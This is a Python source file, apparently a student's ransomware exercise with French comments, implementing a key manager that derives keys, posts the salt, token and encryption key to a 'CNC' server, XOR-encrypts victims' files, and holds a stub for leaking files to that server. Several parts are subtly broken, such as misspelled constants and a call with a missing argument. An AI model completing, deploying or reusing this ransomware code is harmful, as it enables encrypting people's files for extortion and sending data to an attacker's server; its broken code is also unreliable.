from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    #MODIF SUR CETTE DEF
    def do_derivation(self, salt:bytes, key:bytes)->bytes:
         
         #KDF : Key Derivation Function
        kdf = PBKDF2HMAC( 
                algorithm=hashes.SHA256(), #Fonction de hachage 
                length=self.KEY_LENGTH, #Longueur de la clef dérivée
                salt=salt, # Utilisation d'un sel aléatoire pour eviter les attaques par "table arc-en-ciel"
                iterations=self.ITERATION # Ralentis le process  en réduisant le nbr d'itérations
        )
        return kdf.derive(key)


    def create(self)->Tuple[bytes, bytes, bytes]:
        # Génération d'un sel (salt) aléatoire de longueur salt_lenth
        salt = secrets.token_bytes(self.SALT_LENTH)  
        # Génération d'une clé aléatoire
        key = secrets.token_bytes(self.KEY_LENTH)  
        # Utilisation de la fonction de dérivation avec le sel et la clé pour générer un token sécurisé
        token = self.do_derivation(salt, key)  
    
        return salt, key, token  


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")


#MODIF SUR LE CODE
    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # "data" c'est ce qu'on envoie au CNC ! (cadeau)
      data = {
                "salt": self.bin_to_b64(salt), #Clef privé pour chiffrer les fichiers
                "token": self.bin_to_b64(token), #Identifiant unique du ransomware               
                "key": self.bin_to_b64(key), #Valeur aléatoire pour sécuriser la dérivation de la clé
             }
    
      requests.post(f"https://{self._remote_host_port}/new", json=data) # JSON fait référence çàJavaScript, utilisé largement pour les échanges de données entre client et CNC


#MODIF SUR LE CODE
    def setup(self)->None:
         # Assurer que le répertoire de stockage existe
        os.makedirs(self._path, exist_ok=True)
        
        # Définition des chemins pour stocker les fichiers
        token_path = os.path.join(self._path, "token.bin")
        salt_path = os.path.join(self._path, "salt.bin")
        
        # Générer les valeurs cryptographiques
        token = secrets.token_bytes(self.TOKEN_LENGTH)  # Identifiant unique
        salt = secrets.token_bytes(self.SALT_LENGTH)  # Sel aléatoire
        
        # Sauvegarder les données dans des fichiers binaires
        with open(token_path, "wb") as f:
            f.write(token)
        with open(salt_path, "wb") as f:
            f.write(salt)
        
        # Envoyer les données au serveur CNC
        self.post_new(salt, token)

#MODIF SUR CETTE FONCTION
    def load(self)->None:
        # function to load crypto data
        #Chargement du salt et du token
        token_path = os.path.join(self._path, "token.bin")
        salt_path = os.path.join(self._path, "salt.bin")
        key_path = os.path.join(self._path, "key.bin")


        with open(token_path, "rb") as f:
            #On lit le token
            self._token = f.read() 

        with open(salt_path, "rb") as f:
            #La, on lit le sel
            self._salt = f.read() 

    #On verifie juste si la clef existe pour pas que ça plante
        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                #Lecture de la clef
                self._key = f.read() #
        else:
            self._key = None 

#MODIF SUR LE CODE
    def check_key(self, candidate_key:bytes)->bool:
        #Verification de la clef (si elle corespond bien au token)
        return self.do_derivation(self._salt, candidate_key) == self._token

#MODIF SUR LE CODE
    def set_key(self, b64_key:str)->None:
        #Décode la clé et la stock
        key = base64.b64decode(b64_key)
        self._key = key

#MODIF SUR LE CODE
    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        return sha256(self._token).hexdigest() #Comme indiqué : retourne le token en hexa (codé initialement en binaire)

#MODIF SUR LE CODE
    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        # Cipher XOR : permet de chiffrer (et déchiffrer dans l'autre sens) les données
        for file in files:
            print(f"Chiffrement du dossier {file}")
            xorfile(file, self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        #On clean tous les fichiers contenants la clé
        os.remove(os.path.join(self._path, "token.bin"))
        os.remove(os.path.join(self._path, "salt.bin"))
        os.remove(os.path.join(self._path, "key.bin")) 
        